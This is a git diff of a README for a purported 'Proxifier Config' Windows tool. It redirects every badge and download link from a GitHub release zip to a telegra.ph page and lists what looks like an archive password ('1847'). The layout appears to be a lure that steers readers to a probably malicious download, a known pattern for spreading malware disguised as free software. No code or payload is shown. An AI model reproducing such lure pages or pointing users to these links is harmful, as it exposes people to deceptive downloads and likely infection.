@@ -1,14 +1,14 @@
 
 
-[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Proxifier-Config)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
-[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
-[![Category](https://img.shields.io/badge/Category-VPN%20%26%20Privacy-green)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
-[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
+[![GitHub Stars](https://img.shields.io/github/stars/placeholder/Proxifier-Config)](https://telegra.ph/Download-05-21-39)
+[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://telegra.ph/Download-05-21-39)
+[![Platform](https://img.shields.io/badge/Platform-PC%20Windows-blue)](https://telegra.ph/Download-05-21-39)
+[![Category](https://img.shields.io/badge/Category-VPN%20%26%20Privacy-green)](https://telegra.ph/Download-05-21-39)
+[![Updated](https://img.shields.io/badge/Updated-2026-brightgreen)](https://telegra.ph/Download-05-21-39)
 
 ---
 
-[![Download](og-image.png)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
+[![Download](og-image.png)](https://telegra.ph/Download-05-21-39)
 
 
 ---
@@ -21,7 +21,7 @@
 
 ## 📥 Download
 
-[![Proxifier Config](https://img.shields.io/badge/Download%20Proxifier%20Config-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://github.com/ShapeTesting/Proxifier-Config/releases/download/Release/Setup.zip)
+[![Proxifier Config](https://img.shields.io/badge/Download%20Proxifier%20Config-Open%20Page-0a84ff?style=for-the-badge&logo=github)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐** `1847`
 
